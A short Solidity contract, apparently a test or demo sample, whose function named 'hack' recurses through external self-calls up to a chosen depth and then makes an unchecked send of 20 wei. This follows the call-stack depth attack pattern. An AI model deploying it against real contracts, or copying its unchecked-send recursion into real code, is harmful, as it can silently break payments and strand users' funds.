//pragma solidity ^0.4.0;
contract AA{
    uint256 public count=0;
    constructor () payable public{}
    function init(address addr, uint256 max) payable public {
        count =0;
        this.hack(addr,max);
    }
    function hack(address addr, uint256 max) payable public {
        while (count < max) {
            count = count +1;
            this.hack(addr,max);
        }
        if (count == max) {
            addr.send(20);
        }
    }
}